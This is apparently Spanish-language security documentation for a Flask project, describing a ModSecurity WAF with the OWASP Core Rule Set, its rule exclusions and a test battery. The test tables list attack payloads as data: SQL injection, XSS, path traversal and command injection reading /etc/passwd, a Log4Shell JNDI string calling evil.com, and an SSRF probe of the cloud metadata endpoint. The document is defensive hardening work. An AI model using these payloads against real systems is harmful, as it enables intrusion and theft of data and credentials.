# WAF: ModSecurity v3 + OWASP Core Rule Set (CRS)

## Qué es y por qué se usa

Un **WAF (Web Application Firewall)** es un cortafuegos de aplicación que inspecciona el tráfico HTTP en busca de patrones maliciosos antes de que las peticiones lleguen al backend. A diferencia de un firewall de red (capas 3-4), un WAF opera en la capa 7 (aplicación) y puede analizar el contenido de las peticiones: cabeceras, query strings, cuerpos JSON/formulario, cookies, etc.

En esta aplicación se despliega **ModSecurity v3** (motor WAF open source, mantenido por Trustwave/OWASP) junto con el **OWASP Core Rule Set (CRS)**, el conjunto de reglas estándar de la industria que cubre las categorías de ataques más comunes (OWASP Top 10).

### Qué aporta a la aplicación

- **Defensa en profundidad**: las validaciones de entrada del backend (`app/helpers.py`) protegen contra datos malformados; el WAF actúa como **capa adicional** que bloquea ataques conocidos antes de que lleguen al código de la aplicación.
- **Protección contra ataques genéricos**: SQL injection, XSS, path traversal, command injection, scanners automatizados, etc.
- **Sin cambios en el código**: el WAF se despliega como reverse proxy delante del backend; la aplicación Flask no necesita modificaciones.
- **Ocultación del backend**: el usuario se conecta al WAF (Nginx); el backend Flask no es accesible directamente desde fuera de la red Docker.

---

## Arquitectura

```
                    ┌──────────────────────────────────────────────┐
                    │              Red Docker (proxy-network)       │
                    │                                              │
 Usuario :5001 ──▶  │  WAF (Nginx + ModSecurity + CRS)  ──▶  Flask │
                    │  owasp/modsecurity-crs:nginx-alpine    :5001 │
                    │  contenedor: waf_modsecurity            web   │
                    │                                              │
                    └──────────────────────────────────────────────┘
```

| Componente | Detalle |
|------------|---------|
| **Imagen Docker** | `owasp/modsecurity-crs:nginx-alpine` (imagen oficial OWASP) |
| **Contenedor** | `waf_modsecurity` |
| **Puerto expuesto** | `5001` (host) → `8080` (contenedor WAF) |
| **Backend** | `http://web:5001` (solo accesible dentro de la red Docker) |
| **Arranque** | Automático con `make` o `docker-compose up -d`. No requiere perfil. |
| **Dependencia** | `depends_on: web: condition: service_healthy` — el WAF espera a que Flask esté sano antes de aceptar tráfico. |

El servicio `web` (Flask/Gunicorn) usa `expose: "5001"` en lugar de `ports`, por lo que **no publica** su puerto en el host. Toda petición del usuario pasa obligatoriamente por el WAF.

---

## Configuración

Las variables de entorno del contenedor WAF se definen en `docker-compose.yml` → servicio `waf`:

| Variable | Valor | Descripción |
|----------|-------|-------------|
| `BACKEND` | `http://web:5001` | URL interna del backend Flask al que el WAF reenvía las peticiones limpias |
| `MODSEC_RULE_ENGINE` | `On` | Modo de operación de ModSecurity: `On` bloquea las peticiones que coinciden con reglas; `DetectionOnly` solo las registra sin bloquear (útil para pruebas iniciales) |
| `PARANOIA` | `1` | Paranoia Level del OWASP CRS (ver sección siguiente) |
| `ANOMALY_INBOUND` | `5` | Umbral de puntuación de anomalía para peticiones entrantes. Una petición se bloquea cuando la suma de scores de las reglas que activa iguala o supera este umbral |
| `ANOMALY_OUTBOUND` | `4` | Umbral de puntuación de anomalía para respuestas salientes |
| `ALLOWED_METHODS` | `GET HEAD POST OPTIONS PUT DELETE` | Métodos HTTP permitidos; el resto se bloquea |
| `ALLOWED_REQUEST_CONTENT_TYPE` | `application/json`, `multipart/form-data`, etc. | Content-Types permitidos. Incluye `application/json` (necesario para la API REST) |

### Paranoia Level (PL)

El OWASP CRS organiza sus reglas en 4 niveles de paranoia:

| PL | Descripción | Falsos positivos | Uso recomendado |
|----|-------------|------------------|-----------------|
| **1** | Solo reglas de alta confianza. Mínimos falsos positivos. | Muy bajo | **Producción general** (valor actual) |
| 2 | Reglas adicionales de confianza media. | Bajo-medio | Aplicaciones con datos sensibles y tiempo para ajustar exclusiones |
| 3 | Reglas agresivas; muchos patrones detectados. | Medio-alto | Entornos de alta seguridad con exclusiones bien ajustadas |
| 4 | Máxima detección; bloquea casi cualquier patrón sospechoso. | Muy alto | Solo para pruebas o entornos muy controlados |

Se usa **PL 1** porque proporciona buena cobertura contra las categorías de ataques más comunes con un riesgo muy bajo de bloquear peticiones legítimas. Si se sube el PL, es necesario ampliar las exclusiones para evitar falsos positivos.

### Anomaly Scoring

ModSecurity CRS usa un modelo de **anomaly scoring**: cada regla que se activa suma puntos a un contador. La petición se bloquea solo cuando el total acumulado alcanza el umbral configurado.

- **Inbound (5)**: una sola regla crítica (SQL injection, XSS) normalmente suma 5 puntos, lo que bloquea inmediatamente la petición. Dos reglas de severidad menor (2+3) también alcanzan el umbral.
- **Outbound (4)**: protege contra fugas de información en las respuestas (errores SQL, stack traces, etc.).

---

## Exclusiones para falsos positivos

Fichero: **`waf/modsecurity-override.conf`**

Este fichero se monta como regla **AFTER-CRS** (se ejecuta después de cargar todas las reglas del Core Rule Set). Contiene exclusiones específicas para los campos y rutas de la aplicación que disparan falsos positivos.

### Regla 10001 — Campo `password` en rutas de autenticación

```
SecRule REQUEST_URI "@beginsWith /api/auth/"
    ctl:ruleRemoveTargetById=941100-941999;ARGS:password   ← XSS
    ctl:ruleRemoveTargetById=942100-942999;ARGS:password   ← SQLi
    ctl:ruleRemoveTargetById=920272;ARGS:password          ← Tamaño
```

**Motivo**: las contraseñas pueden contener caracteres como `'`, `"`, `<`, `>`, `--`, `OR`, etc., que disparan reglas de inyección SQL y XSS. La exclusión se aplica **solo** al campo `password` y **solo** en las rutas `/api/auth/*`.

### Regla 10002 — Campo `recaptcha_token` en rutas de autenticación

```
SecRule REQUEST_URI "@beginsWith /api/auth/"
    ctl:ruleRemoveTargetById=941100-941999;ARGS:recaptcha_token
    ctl:ruleRemoveTargetById=942100-942999;ARGS:recaptcha_token
```

**Motivo**: el token reCAPTCHA v3 es una cadena base64 larga que puede contener secuencias que coinciden con patrones de inyección.

### Regla 10003 — Campos de nombre en ruta de perfil

```
SecRule REQUEST_URI "@beginsWith /api/user"
    ctl:ruleRemoveTargetById=941100-941999;ARGS:first_name
    ctl:ruleRemoveTargetById=941100-941999;ARGS:last_name
    ctl:ruleRemoveTargetById=942100-942999;ARGS:first_name
    ctl:ruleRemoveTargetById=942100-942999;ARGS:last_name
```

**Motivo**: los nombres pueden contener caracteres Unicode, acentos, apóstrofes (O'Brien) y guiones que activan reglas de inyección.

### Regla 10004 — Dashboard Supervisor (solo desarrollo)

```
SecRule REQUEST_URI "@beginsWith /supervisor"
    ctl:ruleEngine=Off
```

**Motivo**: el supervisor es un dashboard interno de desarrollo que genera tráfico con patrones que activarían múltiples reglas. Se desactiva completamente el motor de reglas para esta ruta. **En producción, el supervisor debe estar desactivado** (`APP_SUPERVISOR=0`).

### SecResponseBodyAccess Off

```
SecResponseBodyAccess Off
```

No se inspeccionan los cuerpos de las respuestas. Esto evita que el WAF analice (y potencialmente bloquee) las respuestas JSON de la API, y previene fugas de información sobre las reglas internas del WAF.

---

## Ataques bloqueados (batería de pruebas verificada)

Se ha ejecutado una batería de 15 pruebas automatizadas contra el WAF. Todas las categorías de ataque son bloqueadas correctamente:

### Inyección SQL

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `?id=1 OR 1=1` | Query string | 403 | Bloqueado |
| `?q=1 UNION SELECT username,password FROM users` | Query string | 403 | Bloqueado |
| `{"username":"admin' OR 1=1--","password":"x"}` | JSON POST | 403 | Bloqueado |

### Cross-Site Scripting (XSS)

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `<script>alert(1)</script>` | Query string | 403 | Bloqueado |
| `<img src=x onerror=alert(1)>` | Query string | 403 | Bloqueado |
| `<svg onload=alert(1)>` | Query string | 403 | Bloqueado |

### Path Traversal / Inclusión de ficheros

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `/..%2f..%2f..%2fetc%2fpasswd` | URL path | 400 | Bloqueado |

### Inyección de comandos del sistema

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `?cmd=;cat /etc/passwd` | Query string | 403 | Bloqueado |
| `?x=\|ls -la` | Query string | 403 | Bloqueado |

### Ataques de protocolo / aplicación

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| Header `${jndi:ldap://evil.com/x}` | Cabecera (Log4Shell) | 403 | Bloqueado |
| `?url=http://169.254.169.254/latest/meta-data/` | SSRF (metadata AWS) | 403 | Bloqueado |
| `%0d%0aSet-Cookie: evil=1` | HTTP Response Splitting | 403 | Bloqueado |

### Detección de scanners y bots

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `User-Agent: Nikto` | Cabecera | 403 | Bloqueado |
| `User-Agent: sqlmap/1.5` | Cabecera | 403 | Bloqueado |

### Fugas de información

| Verificación | Resultado |
|-------------|-----------|
| La respuesta 403 no revela nombre/versión del WAF, servidor ni motor de reglas | Sin fugas |
| Header `Server:` muestra `nginx` sin número de versión | Sin fugas |

---

## Pruebas de integridad (funcionalidad no afectada)

Verificado que el WAF **no bloquea** el tráfico legítimo de la aplicación:

| Endpoint | Método | Resultado |
|----------|--------|-----------|
| `/` | GET | 200 — Página principal cargada |
| `/api/config` | GET | 200 — JSON con `validation_limits` |
| `/api/auth/register` | POST (JSON) | Funcional (pasa a través del WAF) |
| `/api/auth/login` | POST (JSON) | Funcional (pasa a través del WAF) |
| `/api/user` | POST (JSON + CSRF) | Funcional |
| `/api/auth/me` | GET (con sesión) | Funcional |
| `/api/auth/logout` | POST (con CSRF) | Funcional |
| `/static/css/style.css` | GET | 200 — Recursos estáticos servidos |
| `/static/js/main.js` | GET | 200 — JavaScript servido |
| `/static/js/auth.js` | GET | 200 — JavaScript servido |

**213 tests backend** ejecutados dentro del contenedor: todos pasan.

---

## Logging y monitorización

### Ver logs en tiempo real

```bash
make logs-waf
```

### Ficheros de log

Los logs de ModSecurity se persisten en el host en `data/waf/` (volumen montado en `/var/log/modsecurity` del contenedor).

### Qué se registra

- Peticiones bloqueadas (regla activada, score, payload, IP origen).
- Peticiones permitidas que activaron reglas pero no alcanzaron el umbral de anomalía.
- Errores internos del WAF.

### Ejemplo de entrada de log (ataque bloqueado)

Cuando una petición es bloqueada, el log incluye:
- **ID de regla** que se activó (ej. `941100` para XSS, `942100` para SQLi).
- **URI** de la petición.
- **Datos del match** (el fragmento del payload que activó la regla).
- **Puntuación de anomalía** acumulada.
- **Acción** tomada (`deny`, `pass`).

---

## Ficheros del WAF en el proyecto

| Fichero / Directorio | Función |
|----------------------|---------|
| `docker-compose.yml` → servicio `waf` | Definición del contenedor WAF, variables de entorno, volumes, healthcheck |
| `waf/modsecurity-override.conf` | Exclusiones de reglas (falsos positivos) específicas de la aplicación |
| `data/waf/` | Logs persistentes de ModSecurity (montado como volumen, ignorado por `.gitignore`) |

---

## Personalización

### Cambiar a modo detección (sin bloqueo)

Para probar el WAF sin bloquear peticiones (solo registra en log):

```yaml
# docker-compose.yml → servicio waf → environment
- MODSEC_RULE_ENGINE=DetectionOnly
```

### Subir el Paranoia Level

```yaml
- PARANOIA=2  # o 3 o 4
```

> Al subir el PL, es probable que aparezcan nuevos falsos positivos. Revisar los logs (`make logs-waf`), identificar las reglas que se activan con tráfico legítimo y añadir exclusiones en `waf/modsecurity-override.conf`.

### Añadir una nueva exclusión

Formato general para excluir un campo específico de una regla en una ruta concreta:

```
SecRule REQUEST_URI "@beginsWith /api/mi-ruta" \
    "id:10005,\
    phase:1,\
    pass,\
    nolog,\
    ctl:ruleRemoveTargetById=REGLA_ID;ARGS:nombre_campo"
```

- El `id` debe ser único (usar rango 10000+).
- `phase:1` = se aplica en la fase de cabeceras/petición.
- `ctl:ruleRemoveTargetById` desactiva una regla específica solo para ese campo.

---

## Consideraciones de producción

| Aspecto | Recomendación |
|---------|--------------|
| **Supervisor** | Desactivar (`APP_SUPERVISOR=0`). La regla 10004 que desactiva el WAF para `/supervisor` no debería existir en producción. |
| **HTTPS** | En producción, colocar un terminador TLS (Nginx, Traefik, Cloudflare) delante del WAF o configurar certificados en el propio contenedor WAF. |
| **Logs** | Rotar los logs de `data/waf/` con logrotate o similar para evitar que crezcan indefinidamente. |
| **Paranoia Level** | Evaluar si PL 2 es viable tras un período de observación con `DetectionOnly`. |
| **Actualizaciones** | La imagen `owasp/modsecurity-crs:nginx-alpine` se actualiza periódicamente con nuevas reglas. Ejecutar `docker pull owasp/modsecurity-crs:nginx-alpine` y reiniciar. |

---

## Relación con otras medidas de seguridad

El WAF complementa (no sustituye) las demás capas de seguridad de la aplicación:

| Capa | Medida | Documentación |
|------|--------|---------------|
| Entrada | Validación y sanitización de datos | [01. Validación de entradas](01-validacion-entradas.md) |
| Autenticación | Argon2id, HIBP, reCAPTCHA v3 | [02. Autenticación y contraseñas](02-autenticacion-contrasenas.md) |
| Sesión | Cookies HttpOnly, SameSite, CSRF tokens | [03. Sesiones y CSRF](03-sesiones-csrf.md) |
| Transporte | Headers de seguridad, HSTS, SQLCipher | [04. Headers y HTTPS](04-headers-https.md) |
| Aplicación | Rate limiting (Flask-Limiter) | [05. Rate limiting y configuración](05-rate-limiting-y-config.md) |
| **Perímetro** | **WAF: ModSecurity + OWASP CRS** | **Este documento** |

[← Índice de seguridad](../SEGURIDAD.md)
